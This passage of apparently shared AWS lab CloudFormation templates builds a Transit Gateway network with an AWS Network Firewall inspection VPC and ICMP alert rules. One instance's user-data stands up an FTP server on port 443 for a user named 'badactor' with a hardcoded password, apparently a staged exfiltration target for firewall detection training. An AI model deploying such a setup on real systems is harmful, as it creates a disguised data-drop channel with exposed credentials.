      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      IamInstanceProfile: !Ref SubnetCInstanceProfile
      InstanceType: t2.medium
      ImageId: !Ref LatestAmiId
      NetworkInterfaces:
        - AssociatePublicIpAddress: false
          DeviceIndex: '0'
          GroupSet:
            - !Ref SubnetCSecurityGroup
          SubnetId: !Ref SubnetCPublicA
      Tags:
        - Key: Name
          Value: Spoke-VPC-TestInstance5
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex
          sleep 60
          date > /tmp/image.log
          yum update -y

          # Install and configure FTP server
          yum install -y vsftpd
          cat << 'EOF' > /etc/vsftpd/vsftpd.conf
          ftp_data_port=443
          listen_port=443
          anonymous_enable=NO
          pasv_enable=YES
          pasv_min_port=64000
          pasv_max_port=64001
          port_enable=YES
          pasv_addr_resolve=YES
          write_enable=YES
          connect_from_port_20=YES
          ascii_upload_enable=YES
          local_enable=YES
          chroot_local_user=YES
          allow_writeable_chroot=YES
          userlist_enable=YES
          userlist_file=/etc/vsftpd/user_list
          userlist_deny=NO
          pam_service_name=vsftpd
          EOF

          # Configure FTP
          adduser badactor
          echo 5VXcbio8D3nsly | passwd --stdin badactor
          echo badactor | sudo tee ?a /etc/vsftpd/user_list
          mkdir -p /home/badactor/ftp/upload
          chmod 550 /home/badactor/ftp
          chmod 770 /home/badactor/ftp/upload
          chown -R badactor: /home/badactor/ftp

          # Add the public IP to vsftpd config
          { echo -n "pasv_address="; curl -sS "http://checkip.amazonaws.com"; } >> /etc/vsftpd/vsftpd.conf

          # Update the vsftpd configuration file
          sudo sed -i 's/^pasv_addr_resolve=.*$/pasv_addr_resolve=YES/' /etc/vsftpd/vsftpd.conf

          # Get the public IP address and update the pasv_address configuration
          public_ip=$(curl -sS "http://checkip.amazonaws.com")
          sudo sed -i "s/^pasv_address=.*$/pasv_address=${public_ip}/" /etc/vsftpd/vsftpd.conf

          # Restart the vsftpd service to apply the changes
          sudo systemctl restart vsftpd

          # Optional: Print the updated configuration for verification
          cat /etc/vsftpd/vsftpd.conf

          # Start the ftp service and set it to launch when the system boots with the following
          systemctl start vsftpd
          systemctl enable vsftpd
          systemctl status vsftpd > /tmp/vsfptd.status

          # Start SSM Agent
          sudo yum install -y https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm

# Transit Gateway
  TransitGateway:
    Type: "AWS::EC2::TransitGateway"
    Properties:
      AmazonSideAsn: 65000
      Description: "TGW Network Firewall"
      AutoAcceptSharedAttachments: "disable"
      DefaultRouteTableAssociation: "disable"
      DnsSupport: "enable"
      VpnEcmpSupport: "enable"
      Tags:
        - Key: Name
          Value: Transit-Gateway

  AttachVPCA:
    Type: "AWS::EC2::TransitGatewayAttachment"
    Properties:
      SubnetIds: 
        - !Ref SubnetATGW
      Tags:
        - Key: Name
          Value: TGWSpokeVpcA-Attachment
      TransitGatewayId: !Ref TransitGateway
      VpcId: !Ref VPCA

  AttachVPCB:
    Type: AWS::EC2::TransitGatewayAttachment
    Properties:
      SubnetIds: 
        - !Ref SubnetBTGW
      Tags:
        - Key: Name
          Value: TGWSpokeVPCB-Attachment
      TransitGatewayId: !Ref TransitGateway
      VpcId: !Ref VPCB

  AttachVPCC:
    Type: AWS::EC2::TransitGatewayAttachment
    Properties:
      # Options:
      #   ApplianceModeSupport: enable
      SubnetIds: 
        - !Ref SubnetCTGWA
        - !Ref SubnetCTGWB
      Tags:
        - Key: Name
          Value: TGWInspectionVPCC-Attachment
      TransitGatewayId: !Ref TransitGateway
      VpcId: !Ref VPCC

# To ensure flow symmetry, Transit Gateway appliance mode is enabled on the Inspection VPC?s attachment.
# For more details on Transit Gateway appliance mode, refer to:
# https://aws.amazon.com/blogs/networking-and-content-delivery/centralized-inspection-architecture-with-aws-gateway-load-balancer-and-aws-transit-gateway/
# https://docs.aws.amazon.com/vpc/latest/tgw/transit-gateway-appliance-scenario.html
# CloudFormation yet does not support enabling appliance mode. Hence need to enable it using Lambda custom resource:

# Transit Gateway appliance mode Lambda Role:
  TgwLambdaExecutionRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "TGWLambdaRole-${AWS::AccountId}"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: root
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: !GetAtt TgwApplianceModeLogGroup.Arn
              - Effect: Allow
                Action:
                  - ec2:ModifyTransitGatewayVpcAttachment
                Resource: 
                  - !Sub "arn:aws:ec2:${AWS::Region}:${AWS::AccountId}:transit-gateway-attachment/*"
                  - !Sub "arn:aws:ec2:${AWS::Region}:${AWS::AccountId}:subnet/*"
              - Effect: Allow
                Action:
                  - ec2:DescribeTransitGatewayVpcAttachments
                Resource: "*"

# Enable Transit Gateway Appliance Mode Lambda Custom Resource:
  TgwApplianceModeLogGroup:
    Type: AWS::Logs::LogGroup
    Properties:
        LogGroupName: !Sub "/Cloudformation/Lambda/TGWApplianceMode-${AWS::Region}"
        RetentionInDays: 1

  TgwApplianceMode:
    Type: AWS::Lambda::Function
    DependsOn: TgwApplianceModeLogGroup
    Properties:
      FunctionName: DemoTgwApplianceMode
      Handler: "index.handler"
      Role: !GetAtt TgwLambdaExecutionRole.Arn
      Code:
        ZipFile: |
          import boto3
          import cfnresponse
          import json
          import logging

          def handler(event, context):
              logger = logging.getLogger()
              logger.setLevel(logging.INFO)
              responseData = {}
              responseStatus = cfnresponse.FAILED
              logger.info('Received event: {}'.format(json.dumps(event)))
              if event["RequestType"] == "Delete":
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
              if event["RequestType"] == "Create":
                  try:
                      TgwInspectionVpcAttachmentId = event["ResourceProperties"]["TgwInspectionVpcAttachmentId"]
                      ApplianceMode = event["ResourceProperties"]["ApplianceMode"]
                  except Exception as e:
                      logger.info('Key retrieval failure: {}'.format(e))
                  try:
                      ec2 = boto3.client('ec2')
                  except Exception as e:
                      logger.info('boto3.client failure: {}'.format(e))
                  try:
                      ec2.modify_transit_gateway_vpc_attachment(
                          TransitGatewayAttachmentId = TgwInspectionVpcAttachmentId,
                          Options = {'ApplianceModeSupport': ApplianceMode}
                      )
                      TgwResponse = ec2.describe_transit_gateway_vpc_attachments(
                          TransitGatewayAttachmentIds=[TgwInspectionVpcAttachmentId]
                      )
                      ApplianceModeStatus = TgwResponse['TransitGatewayVpcAttachments'][0]['Options']['ApplianceModeSupport']
                  except Exception as e:
                      logger.info('ec2.modify/describe_transit_gateway_vpc_attachment: {}'.format(e))

                  responseData['ApplianceModeStatus'] = ApplianceModeStatus
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
      Runtime: python3.11
      Timeout: 30

  ApplianceModeEnabled:
    Type: Custom::ModifyTransitGatewayVpcAttachment
    Properties:
      ServiceToken: !GetAtt TgwApplianceMode.Arn
      TgwInspectionVpcAttachmentId: !Ref AttachVPCC
      ApplianceMode: enable
 
# Firewall:
  # Inspection Firewall Rule Groups:
  ICMPAlertStatefulRuleGroup:
    Type: AWS::NetworkFirewall::RuleGroup
    Properties:
      RuleGroupName: IcmpAlert-RuleGroup
      Type: STATEFUL
      Capacity: 100
      RuleGroup:
        RulesSource:
          StatefulRules:
            - Action: ALERT
              Header:
                Direction: ANY
                Protocol: ICMP
                Destination: ANY
                Source: ANY
                DestinationPort: ANY
                SourcePort: ANY
              RuleOptions:
                - Keyword: "sid:1"
      Tags:
        - Key: Name
          Value: IcmpAlert-RuleGroup 

  # Inspection Firewall Policy:
  InspectionFirewallPolicy:
    DependsOn: 
      - ICMPAlertStatefulRuleGroup
    Type: AWS::NetworkFirewall::FirewallPolicy
    Properties:
      FirewallPolicyName: InspectionFirewall-Policy
      FirewallPolicy:
        StatelessDefaultActions:
          - 'aws:forward_to_sfe'
        StatelessFragmentDefaultActions:
          - 'aws:forward_to_sfe'
        StatefulRuleGroupReferences:
          #- ResourceArn: !Ref DomainAllowStatefulRuleGroup
          - ResourceArn: !Ref ICMPAlertStatefulRuleGroup
      Tags:
        - Key: Name
          Value: InspectionFirewall-Policy

  # Inspection Firewall:
  InspectionFirewall:
    DependsOn: 
      - ICMPAlertStatefulRuleGroup
    Type: AWS::NetworkFirewall::Firewall
    Properties:
      FirewallName: InspectionFirewall
      FirewallPolicyArn: !Ref InspectionFirewallPolicy
      VpcId: !Ref VPCC
      SubnetMappings:
        - SubnetId: !Ref SubnetCFirewallA
        - SubnetId: !Ref SubnetCFirewallB
      Tags:
        - Key: Name
          Value: InspectionFirewall

  #SpokeVPC DNS Querylog Logging:
  SpokeVpcADnsQuerylogGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/Lab/Route53/QueryLogs"

  # Inspection Firewall Logging:
  InspectionFirewallLogFlowGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/Lab/NetworkFirewall/Flow"

  InspectionFirewallLogAlertGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/Lab/NetworkFirewall/Alert"
    
  InspectionFirewallLog:
    Type: AWS::NetworkFirewall::LoggingConfiguration
    Properties:
      FirewallArn: !Ref InspectionFirewall
      LoggingConfiguration:
        LogDestinationConfigs:
          - LogType: FLOW
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: !Ref InspectionFirewallLogFlowGroup
          - LogType: ALERT
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: !Ref InspectionFirewallLogAlertGroup

# Fn::GetAtt for Firewall do not return VPCE Id in ordered format.
# For more details refer to: https://github.com/aws-cloudformation/aws-cloudformation-resource-providers-networkfirewall/issues/15
# Until the bug is fixed we have to rely on custom resource to retrieve AZ specific VPCE Id.

# Firewall Endpoint Id Retrieval Lambda Role:
  FwLambdaExecutionRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "LambdaRole-${AWS::AccountId}"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: root
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: !GetAtt RetrieveVpcIdLogGroup.Arn
              - Effect: Allow
                Action:
                  - network-firewall:DescribeFirewall
                Resource: !Sub "arn:aws:network-firewall:${AWS::Region}:${AWS::AccountId}:firewall/*"

# Retrieve VpceId Lambda Custom Resource:
  RetrieveVpcIdLogGroup:
    Type: AWS::Logs::LogGroup
    Properties:
        LogGroupName: !Sub "/Cloudformation/Lambda/RetrieveVpceId-${AWS::Region}"
        RetentionInDays: 1

  RetrieveVpceId:
    Type: AWS::Lambda::Function
    DependsOn: RetrieveVpcIdLogGroup
    Properties:
      FunctionName: !Sub "RetrieveVpceId-${AWS::AccountId}"
      Handler: "index.handler"
      Role: !GetAtt
        - FwLambdaExecutionRole
        - Arn
      Code:
        ZipFile: |
          import boto3
          import cfnresponse
          import json
          import logging

          def handler(event, context):
              logger = logging.getLogger()
              logger.setLevel(logging.INFO)
              responseData = {}
              responseStatus = cfnresponse.FAILED
              logger.info('Received event: {}'.format(json.dumps(event)))
              if event["RequestType"] == "Delete":
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
              if event["RequestType"] == "Create":
                  try:
                      Az1 = event["ResourceProperties"]["Az1"]
                      Az2 = event["ResourceProperties"]["Az2"]
                      FwArn = event["ResourceProperties"]["FwArn"]
                  except Exception as e:
                      logger.info('AZ retrieval failure: {}'.format(e))
                  try:
                      nfw = boto3.client('network-firewall')
                  except Exception as e:
                      logger.info('boto3.client failure: {}'.format(e))
                  try:
                      NfwResponse=nfw.describe_firewall(FirewallArn=FwArn)
                      VpceId1 = NfwResponse['FirewallStatus']['SyncStates'][Az1]['Attachment']['EndpointId']
                      VpceId2 = NfwResponse['FirewallStatus']['SyncStates'][Az2]['Attachment']['EndpointId']

                  except Exception as e:
                      logger.info('ec2.describe_firewall failure: {}'.format(e))

                  responseData['FwVpceId1'] = VpceId1
                  responseData['FwVpceId2'] = VpceId2
                  responseStatus = cfnresponse.SUCCESS
                  cfnresponse.send(event, context, responseStatus, responseData)
      Runtime: python3.11
      Timeout: 30

  InspectionFirewallVpceIds:
    Type: Custom::DescribeVpcEndpoints
    Properties:
      ServiceToken: !GetAtt RetrieveVpceId.Arn
      Az1: 
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      Az2:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      FwArn: !Ref InspectionFirewall

# Route Tables:
# Spoke VPC A route table configuration:
  SubnetAWorkloadRouteTableA:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCA
      Tags:
        - Key: Name
          Value: Spoke-VPC-A-WorkloadRouteTableA

  SubnetAWorkloadRouteTableAAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetAWorkloadRouteTableA
      SubnetId: !Ref SubnetAWorkload

  SubnetAWorkloadDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachVPCA
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayId: !Ref TransitGateway
      RouteTableId: !Ref SubnetAWorkloadRouteTableA

  SubnetATGWRouteTableA:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCA
      Tags:
        - Key: Name
          Value: Spoke-VPC-A-TGWRouteTableA

  SubnetATGWRouteTableAAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetATGWRouteTableA
      SubnetId: !Ref SubnetATGW
 
# Spoke VPC B route table configuration:
  SubnetBWorkloadRouteTableB:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCB
      Tags:
        - Key: Name
          Value: Spoke-VPC-B-WorkloadRouteTable

  SubnetBWorkloadRouteTableBAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetBWorkloadRouteTableB
      SubnetId: !Ref SubnetBWorkload

  SubnetBWorkloadDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachVPCB
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayId: !Ref TransitGateway
      RouteTableId: !Ref SubnetBWorkloadRouteTableB

  SubnetBTGWRouteTableB:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCB
      Tags:
        - Key: Name
          Value: Spoke-VPC-B-TGWRouteTableB

  SubnetBTGWRouteTableBAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetBTGWRouteTableB
      SubnetId: !Ref SubnetBTGW

# Inspection + Egress VPC C route table configuration: AZ A
  # Route Tables:
  SubnetCTGWRouteTableA:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-TGWRouteTableA  

  SubnetCFirewallRouteTableA:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-FirewallRouteTableA

  SubnetCPublicRouteTableA:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-PublicRouteTableA

  # Route Table Association:
  SubnetCTGWRouteTableAAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCTGWRouteTableA
      SubnetId: !Ref SubnetCTGWA

  SubnetCFirewallRouteTableAAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCFirewallRouteTableA
      SubnetId: !Ref SubnetCFirewallA

  SubnetCPublicRouteTableAAssociation:
    DependsOn: SubnetCPublicADefaultRoute
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCPublicRouteTableA
      SubnetId: !Ref SubnetCPublicA      
  
  # Add Routes:
  SubnetCTGWADefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: InspectionFirewall   
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      VpcEndpointId: !GetAtt InspectionFirewallVpceIds.FwVpceId1
      RouteTableId: !Ref SubnetCTGWRouteTableA

  SubnetCFirewallAInternalRoute:
    DependsOn: AttachVPCC
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      TransitGatewayId: !Ref TransitGateway
      RouteTableId: !Ref SubnetCFirewallRouteTableA

  SubnetCFirewallADefaultRoute:
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      NatGatewayId: !Ref SubnetCNATGatewayA
      RouteTableId: !Ref SubnetCFirewallRouteTableA

  SubnetCPublicAInternalRoute:
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      VpcEndpointId: !GetAtt InspectionFirewallVpceIds.FwVpceId1
      RouteTableId: !Ref SubnetCPublicRouteTableA
      
  SubnetCPublicADefaultRoute:
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      GatewayId: !Ref InternetGatewayVPCC
      RouteTableId: !Ref SubnetCPublicRouteTableA

# Inspection + Egress VPC route table configuration: AZ B
  # Route Tables:
  SubnetCTGWRouteTableB:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-TGWRouteTableB

  SubnetCFirewallRouteTableB:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-FirewallRouteTableB

  SubnetCPublicRouteTableB:
    DependsOn:
      - SubnetCPublicA
      - SubnetCTGWB
      - SubnetCFirewallB
      - SubnetCPublicB
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref VPCC
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-PublicRouteTableB

  # Route Table Association:          
  SubnetCTGWRouteTableBAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCTGWRouteTableB
      SubnetId: !Ref SubnetCTGWB

  SubnetCFirewallRouteTableBAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCFirewallRouteTableB
      SubnetId: !Ref SubnetCFirewallB

  SubnetCPublicRouteTableBAssociation:
    DependsOn: SubnetCPublicBDefaultRoute
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref SubnetCPublicRouteTableB
      SubnetId: !Ref SubnetCPublicB
  
  # Add Routes:
  SubnetCTGWBDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: InspectionFirewall
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      VpcEndpointId: !GetAtt InspectionFirewallVpceIds.FwVpceId2
      RouteTableId: !Ref SubnetCTGWRouteTableB

  SubnetCFirewallBInternalRoute:
    DependsOn: AttachVPCC
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      TransitGatewayId: !Ref TransitGateway
      RouteTableId: !Ref SubnetCFirewallRouteTableB

  SubnetCFirewallBDefaultRoute:
    DependsOn: AttachVPCC
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      NatGatewayId: !Ref SubnetCNATGatewayB
      RouteTableId: !Ref SubnetCFirewallRouteTableB

  SubnetCPublicBInternalRoute:
    DependsOn: AttachVPCC
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "10.0.0.0/8"
      VpcEndpointId: !GetAtt InspectionFirewallVpceIds.FwVpceId2
      RouteTableId: !Ref SubnetCPublicRouteTableB
      
  SubnetCPublicBDefaultRoute:
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      GatewayId: !Ref InternetGatewayVPCC
      RouteTableId: !Ref SubnetCPublicRouteTableB

# TransitGateway route table configuration:
  SpokeRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTable
    Properties:
      Tags:
        - Key: Name
          Value: TGW-SpokeRouteTable
      TransitGatewayId: !Ref TransitGateway
      
  FirewallRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTable
    Properties:
      Tags:
        - Key: Name
          Value: TGW-FirewallRouteTable
      TransitGatewayId: !Ref TransitGateway
      
  AssociateVPCARouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachVPCA
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  AssociateVPCBRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachVPCB
      TransitGatewayRouteTableId: !Ref SpokeRouteTable

  AssociateVPCCRouteTable:
    Type: AWS::EC2::TransitGatewayRouteTableAssociation
    Properties:
      TransitGatewayAttachmentId: !Ref AttachVPCC
      TransitGatewayRouteTableId: !Ref FirewallRouteTable

  SpokeInspectionRoute:
    Type: AWS::EC2::TransitGatewayRoute
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayAttachmentId: !Ref AttachVPCC
      TransitGatewayRouteTableId: !Ref SpokeRouteTable
      
  FirewallSpokeVPCARoute:
    Type: AWS::EC2::TransitGatewayRoute
    Properties:
      DestinationCidrBlock: "10.1.0.0/16"
      TransitGatewayAttachmentId: !Ref AttachVPCA
      TransitGatewayRouteTableId: !Ref FirewallRouteTable
      
  FirewallSpokeVPCBRoute:
    Type: AWS::EC2::TransitGatewayRoute
    Properties:
      DestinationCidrBlock: "10.2.0.0/16"
      TransitGatewayAttachmentId: !Ref AttachVPCB
      TransitGatewayRouteTableId: !Ref FirewallRouteTable

  # Standard lab resources

# Do not delete Outputs, required for triggering TGW applince mode custom resource:
Outputs:
  InspectionVpcApplianceModeStatus:
    Description: Transit Gateway Inspection VPC Attachment Appliance Mode Status
    Value: !GetAtt ApplianceModeEnabled.ApplianceModeStatus
```


Template 2:

```yaml
AWSTemplateFormatVersion: 2010-09-09

Parameters:
  LabRegions:
    Type: String

  LabUserRoleName:
    Type: String

Resources:
  LabEnforcer:
    Type: AWS::CloudFormation::Stack
    DeletionPolicy: Delete
    UpdateReplacePolicy: Delete
    Properties:
      TemplateURL:
        Fn::Sub: https://${AWS::Region}-tcprod.s3.${AWS::Region}.amazonaws.com/courses/aws-tc-labenforcer/LabEnforcer.yml
      Parameters:
        AllowedRegions:
          Ref: LabRegions
        LabUserRoleName:
          Ref: LabUserRoleName
        Ec2MaxInstances: '6'
      Tags:
        - Key: labs:permission-scope
          Value: protected
```

Template 3:

```yaml
AWSTemplateFormatVersion: 2010-09-09

Parameters:
  LabUserRoleName:
    Type: String

Resources:
  AttachPolicies:
    Type: Custom::AttachPolicies
    Properties:
      ServiceToken: !GetAtt AttachPoliciesFunction.Arn
      DeleteFunctions:
        - !Ref AttachPoliciesFunction
      DeleteRoles:
        - !Ref AttachPoliciesRole
      PolicyArns:
        - arn:aws:iam::aws:policy/ReadOnlyAccess
      RoleName: !Ref LabUserRoleName

  AttachPoliciesFunction:
    Type: AWS::Lambda::Function
    Metadata:
      guard:
        SuppressedRules:
          - LAMBDA_INSIDE_VPC: "Suppressed - No risk, student does not have access to lambda, used for setting up student access"
    Properties:
      Handler: index.handler
      MemorySize: 128
      Timeout: 180
      Role: !GetAtt AttachPoliciesRole.Arn
      Runtime: python3.11
      Code:
        ZipFile: |
          import boto3
          import cfnresponse
          import json

          _iam = boto3.resource("iam")
          _lambda = boto3.client("lambda")


          def delete_resources(event):
              for role_name in event.get("ResourceProperties").get("DeleteRoles"):
                  role = _iam.Role(name=role_name)

                  for role_policy in role.policies.all():
                      role_policy.delete()

                  role.delete()

              for function_name in event.get("ResourceProperties").get("DeleteFunctions"):
                  _lambda.delete_function(FunctionName=function_name)


          def handler(event, context):
              try:
                  # Only handle 'Create' requests.
                  if event.get("RequestType") == "Create":
                      role = _iam.Role(name=event.get("ResourceProperties").get("RoleName"))

                      for policy_arn in event.get("ResourceProperties").get("PolicyArns"):
                          role.attach_policy(PolicyArn=policy_arn)

                      cfnresponse.send(event, context, cfnresponse.SUCCESS, {}, reason="Policies Attached")
                  else:
                      cfnresponse.send(event, context, cfnresponse.SUCCESS, {}, reason="No Action Performed")
              except Exception as exception:
                  cfnresponse.send(event, context, cfnresponse.FAILED, {}, reason=str(exception))
              finally:
                  delete_resources(event)

  AttachPoliciesRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Action: sts:AssumeRole
            Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
      Policies:
        - PolicyName: AttachPolicies
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Action:
                  - iam:AttachRolePolicy
                Effect: Allow
                Resource:
                  - !Sub arn:${AWS::Partition}:iam::${AWS::AccountId}:role/${LabUserRoleName}
                Condition:
                  ArnEquals:
                    iam:PolicyArn:
                      - arn:aws:iam::aws:policy/ReadOnlyAccess
              - Action:
                  - iam:DeleteRole
                  - iam:DeleteRolePolicy
                  - iam:ListRolePolicies
                Effect: Allow
                Resource:
                  - !Sub arn:${AWS::Partition}:iam::${AWS::AccountId}:role/*-AttachPoliciesRole-*
              - Action:
                  - lambda:DeleteFunction
                Effect: Allow
                Resource:
                  - !Sub arn:${AWS::Partition}:lambda:${AWS::Region}:${AWS::AccountId}:function:*-AttachPoliciesFunction-*
```

Template 4:

Cannot load

<img width="1130" height="510" alt="image" src="https://github.com/user-attachments/assets/6babbab3-7169-4231-9380-a7ac4c9e0d4d" />

